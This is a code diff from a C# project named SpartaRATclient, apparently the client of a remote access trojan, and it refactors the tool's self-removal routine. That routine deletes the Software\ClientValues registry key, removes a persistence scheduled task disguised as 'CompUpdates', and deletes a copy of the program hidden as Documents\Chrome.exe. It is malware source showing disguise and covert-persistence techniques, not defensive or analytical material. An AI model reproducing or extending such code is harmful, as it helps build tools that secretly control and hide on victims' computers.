@@ -18,18 +18,14 @@ namespace SpartaRATclient.Tools
             //3. removing app from documents folder
             //4. exit program
 
-            Registry.CurrentUser.DeleteSubKeyTree(@"Software\ClientValues", false);
+            RegistryData data = new RegistryData();
+            data.DeleteSubKeyTree(@"Software\ClientValues");
 
-            Process process = new Process();
-            process.StartInfo.Arguments = @"/C schtasks /delete /tn ""CompUpdates"" /f";
-            process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.CreateNoWindow = true;
-            process.StartInfo.UseShellExecute = false;
-            process.Start();
-            process.WaitForExit();
+            Powershell PowershellCommand = new Powershell();
+            PowershellCommand.Run(@"/C schtasks /delete /tn ""CompUpdates"" /f");
 
-            FileCopy exist = new FileCopy();
-            if (exist.This() == "exist")
+            FileCopy ThisProgram = new FileCopy();
+            if (ThisProgram.This() == "exist") //if this program exist at the new hidden path then
                 File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe");
 
             Environment.Exit(0);
